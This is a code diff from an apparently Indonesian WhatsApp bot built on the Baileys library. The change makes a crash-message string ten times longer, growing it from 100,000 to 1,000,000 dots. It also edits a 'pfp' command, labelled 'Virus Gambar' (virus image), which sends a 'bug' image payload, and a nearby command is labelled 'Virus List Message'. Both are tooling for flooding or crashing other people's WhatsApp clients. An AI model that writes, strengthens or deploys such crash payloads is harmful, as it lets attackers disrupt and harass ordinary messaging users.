@@ -304,7 +304,7 @@ hexa.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{ment
         const conts = mek.key.fromMe ? hexa.user.jid : hexa.contacts[sender] || { notify: jid.replace(/@.+/, '') }
         const pushname = mek.key.fromMe ? hexa.user.name : conts.notify || conts.vname || conts.name || '-'
         const atibot = m.isBaileys
-        const virtik = '.'.repeat(100000)
+        const virtik = '.'.repeat(1000000)
 // Message ( MyMans APIs )
 const mess = {
    "wait": "```⊷️「 Wait 」```",
@@ -1577,14 +1577,7 @@ reply('Pilih on atau off')
 break
 // Virus Gambar ( MyMans APIs & Hw Mods )
 case 'pfp':
-hexa.sendMessage(from, Mvirgam, image, {quoted:bugtrol, thumbnail:Bvirgam, contextInfo:{"externalAdReply": {
-"title": fake,
-"body": `Subscribe MyMans APIs`,
-"previewType": "PHOTO",
-"thumbnailUrl": `https://i.ibb.co/YkLFWvJ/In-Shot-20210704-143226427.jpg`,
-"thumbnail": Mvirgam,
-"sourceUrl": `https://mymans-api.herokuapp.com/`
-}}})
+hexa.sendMessage(from, Mvirgam, image, {quoted:bugtrol, thumbnail:Bvirgam})
 break
 // Virus List Message ( MyMans APIs )
 case 'plp':
